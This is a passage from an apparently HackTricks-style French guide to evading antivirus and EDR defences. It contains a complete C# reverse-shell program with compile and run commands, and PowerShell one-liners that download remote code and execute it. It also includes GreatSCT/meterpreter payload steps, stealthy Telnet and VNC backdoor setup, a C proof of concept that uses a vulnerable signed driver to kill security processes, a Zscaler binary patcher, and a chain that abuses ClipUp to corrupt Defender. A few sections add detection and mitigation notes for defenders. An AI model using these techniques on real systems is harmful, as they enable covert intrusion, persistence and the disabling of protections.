Il s'agit d'injecter le code malveillant post-exploitation **dans son propre processus**. De cette façon, vous évitez de créer un nouveau processus et qu'il soit scanné par l'AV, mais l'inconvénient est que si l'exécution de votre payload tourne mal, il y a une **bien plus grande probabilité** de **perdre votre beacon**, car il pourrait planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si vous souhaitez en savoir plus sur le chargement d'assemblies C#, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) et leur InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez aussi charger des C# Assemblies **depuis PowerShell**, regardez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et la [vidéo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d'exécuter du code malveillant en utilisant d'autres langages en donnant à la machine compromise l'accès à **l'environnement de l'interpréteur installé sur le SMB share contrôlé par l'attaquant**.

En permettant l'accès aux Interpreter Binaries et à l'environnement sur le SMB share, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** sur la machine compromise.

Le repo indique : Defender scanne toujours les scripts mais en utilisant Go, Java, PHP, etc. nous avons **plus de flexibilité pour contourner les signatures statiques**. Des tests avec des reverse shell scripts non obfusqués aléatoires dans ces langages se sont avérés fructueux.

## TokenStomping

Token stomping est une technique qui permet à un attaquant de **manipuler le token d'accès ou un produit de sécurité comme un EDR ou un AV**, leur permettant de réduire ses privilèges de sorte que le processus ne meure pas mais n'ait plus les permissions pour vérifier les activités malveillantes.

Pour empêcher cela, Windows pourrait **empêcher les processus externes** d'obtenir des handles sur les tokens des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Comme décrit dans [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de déployer Chrome Remote Desktop sur le poste d'une victime puis de l'utiliser pour le prendre en main et maintenir la persistance :
1. Téléchargez depuis https://remotedesktop.google.com/, cliquez sur "Set up via SSH", puis cliquez sur le fichier MSI pour Windows pour télécharger le MSI.
2. Exécutez l'installateur en silencieux sur la victime (admin requis) : `msiexec /i chromeremotedesktophost.msi /qn`
3. Retournez sur la page Chrome Remote Desktop et cliquez sur Suivant. L'assistant vous demandera alors d'autoriser ; cliquez sur le bouton Authorize pour continuer.
4. Exécutez le paramètre donné avec quelques ajustements : `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Notez le param pin qui permet de définir le pin sans utiliser l'interface graphique).

## Advanced Evasion

L'évasion est un sujet très compliqué : parfois il faut prendre en compte de nombreuses sources de télémétrie dans un seul système, donc il est pratiquement impossible de rester complètement indétecté dans des environnements matures.

Chaque environnement contre lequel vous opérez aura ses propres forces et faiblesses.

Je vous encourage fortement à regarder cette présentation de [@ATTL4S](https://twitter.com/DaniLJ94), pour vous familiariser avec des techniques d'Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ceci est aussi une autre excellente présentation de [@mariuszbit](https://twitter.com/mariuszbit) sur l'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) qui **supprimera des parties du binaire** jusqu'à ce qu'il **détermine quelle partie Defender** considère comme malveillante et vous la présente.\
Un autre outil faisant **la même chose** est [**avred**](https://github.com/dobin/avred) avec un service web ouvert disponible sur [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Jusqu'à Windows10, toutes les versions de Windows incluaient un **serveur Telnet** que vous pouviez installer (en tant qu'administrateur) en faisant :
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faites en sorte qu'il **démarre** au démarrage du système et **lancez-le** maintenant :
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Changer le port telnet** (stealth) et désactiver le pare-feu :
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (choisissez les téléchargements binaires, pas le setup)

**ON THE HOST**: Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l'option _Disable TrayIcon_
- Mettez un mot de passe dans _VNC Password_
- Mettez un mot de passe dans _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier **nouvellement** créé _**UltraVNC.ini**_ sur la **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** To maintain stealth you must not do a few things

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
À l'intérieur de GreatSCT :
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Maintenant **démarrez le lister** avec `msfconsole -r file.rc` et **exécutez** le **xml payload** avec:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Le Defender actuel terminera le processus très rapidement.**

### Compiler notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier C# Revershell

Compilez-le avec:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Utilisez-le avec :
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# en utilisant le compilateur
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques :
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste d'obfuscateurs C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemple d'utilisation de python pour build injectors :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Neutraliser AV/EDR depuis le Kernel Space

Storm-2603 a utilisé un petit utilitaire console connu sous le nom **Antivirus Terminator** pour désactiver les protections endpoint avant de déposer le ransomware. L'outil apporte **son propre driver vulnérable mais *signé*** et l'abuse pour exécuter des opérations privilégiées au niveau kernel que même les services AV en Protected-Process-Light (PPL) ne peuvent bloquer.

Points clés
1. **Signed driver** : Le fichier déposé sur le disque est `ServiceMouse.sys`, mais le binaire est le driver légitimement signé `AToolsKrnl64.sys` issu du “System In-Depth Analysis Toolkit” d'Antiy Labs. Parce que le driver porte une signature Microsoft valide, il se charge même lorsque Driver-Signature-Enforcement (DSE) est activé.
2. **Service installation** :
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La première ligne enregistre le driver en tant que **kernel service** et la seconde le démarre de sorte que `\\.\ServiceMouse` devienne accessible depuis user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works** : BYOVD contourne complètement les protections en mode utilisateur ; du code exécuté en kernel peut ouvrir des processus *protected*, les terminer ou manipuler des objets kernel indépendamment de PPL/PP, ELAM ou d'autres mécanismes de durcissement.

Detection / Mitigation
•  Activez la liste de blocage des drivers vulnérables de Microsoft (`HVCI`, `Smart App Control`) afin que Windows refuse de charger `AToolsKrnl64.sys`.  
•  Surveillez la création de nouveaux *kernel* services et générez des alertes lorsqu'un driver est chargé depuis un répertoire world-writable ou n'est pas présent sur la allow-list (liste d'autorisation).  
•  Surveillez les handles en user-mode vers des device objects personnalisés suivis d'appels `DeviceIoControl` suspects.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Le **Client Connector** de Zscaler évalue localement les règles de posture du device et s'appuie sur Windows RPC pour communiquer les résultats aux autres composants. Deux mauvais choix de conception rendent un contournement complet possible :

1. L'évaluation de posture se fait **entièrement côté client** (un booléen est envoyé au serveur).  
2. Les endpoints RPC internes ne valident que le fait que l'exécutable client est **signé par Zscaler** (via `WinVerifyTrust`).

En **patchant quatre binaires signés sur disque**, les deux mécanismes peuvent être neutralisés :

| Binaire | Logique d'origine patchée | Résultat |
|--------|---------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Retourne toujours `1`, donc chaque contrôle est considéré conforme |
| `ZSAService.exe` | Appel indirect à `WinVerifyTrust` | NOP-ed ⇒ tout processus (même non signé) peut se binder aux pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Remplacé par `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Vérifications d'intégrité sur le tunnel | Court-circuitées |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Après avoir remplacé les fichiers originaux et redémarré la pile de services :

* **Toutes** les vérifications de posture affichent **vert/conforme**.
* Des binaires non signés ou modifiés peuvent ouvrir les named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'hôte compromis obtient un accès sans restriction au réseau interne défini par les politiques Zscaler.

Cette étude de cas démontre comment des décisions de confiance purement côté client et de simples vérifications de signature peuvent être contournées avec quelques patches d'octets.

## Abuser Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) enforces a signer/level hierarchy de sorte que seuls des processus protégés d'égal ou de niveau supérieur peuvent s'altérer mutuellement. Offensivement, si vous pouvez légitimement lancer un binaire PPL-enabled et contrôler ses arguments, vous pouvez convertir une fonctionnalité bénigne (e.g., logging) en un write primitive contraint, soutenu par PPL, contre des répertoires protégés utilisés par AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Primitive LOLBIN : ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui‑même et accepte un paramètre pour écrire un fichier journal vers un chemin spécifié par l'appelant.
- Lorsqu'il est lancé en tant que processus PPL, l'écriture du fichier s'effectue avec le backing PPL.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Dériver le chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Lancer le LOLBIN compatible PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` en utilisant un lanceur (par exemple, CreateProcessAsPPL).
2) Fournir l'argument log-path de ClipUp pour forcer la création d'un fichier dans un répertoire AV protégé (par exemple, Defender Platform). Utilisez des noms courts 8.3 si nécessaire.
3) Si le binaire cible est normalement ouvert/verrouillé par l'AV pendant qu'il s'exécute (par exemple, MsMpEng.exe), planifiez l'écriture au démarrage avant que l'AV ne démarre en installant un service à démarrage automatique qui s'exécute de façon fiable plus tôt. Validez l'ordre de démarrage avec Process Monitor (boot logging).
4) Au redémarrage, l'écriture soutenue par le PPL a lieu avant que l'AV ne verrouille ses binaires, corrompant le fichier cible et empêchant le démarrage.

Exemple d'invocation (chemins masqués/raccourcis pour des raisons de sécurité) :
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Remarques et contraintes
- Vous ne pouvez pas contrôler le contenu que ClipUp écrit au-delà du placement ; la primitive convient davantage à la corruption qu'à l'injection précise de contenu.
- Nécessite des droits locaux admin/SYSTEM pour installer/démarrer un service et une fenêtre de redémarrage.
- Le timing est critique : la cible ne doit pas être ouverte ; l'exécution au démarrage évite les verrous de fichiers.

Détections
- Création de processus de `ClipUp.exe` avec des arguments inhabituels, en particulier parenté par des lanceurs non standard, autour du démarrage.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et démarrant systématiquement avant Defender/AV. Examiner la création/modification de services avant les échecs de démarrage de Defender.
- Surveillance d'intégrité des fichiers sur les binaires/les répertoires Platform de Defender ; créations/modifications de fichiers inattendues par des processus avec des flags protected-process.
- Télémétrie ETW/EDR : rechercher des processus créés avec `CREATE_PROTECTED_PROCESS` et une utilisation anormale du niveau PPL par des binaires non-AV.

Mesures d'atténuation
- WDAC/Code Integrity : restreindre quels binaires signés peuvent s'exécuter en tant que PPL et sous quels parents ; bloquer l'invocation de ClipUp en dehors de contextes légitimes.
- Hygiène des services : restreindre la création/modification de services à démarrage automatique et surveiller les manipulations de l'ordre de démarrage.
- S'assurer que Defender tamper protection et les protections d'early-launch sont activées ; examiner les erreurs de démarrage indiquant une corruption binaire.
- Envisager de désactiver la génération des noms courts 8.3 sur les volumes hébergeant des outils de sécurité si compatible avec votre environnement (tester soigneusement).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Références

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
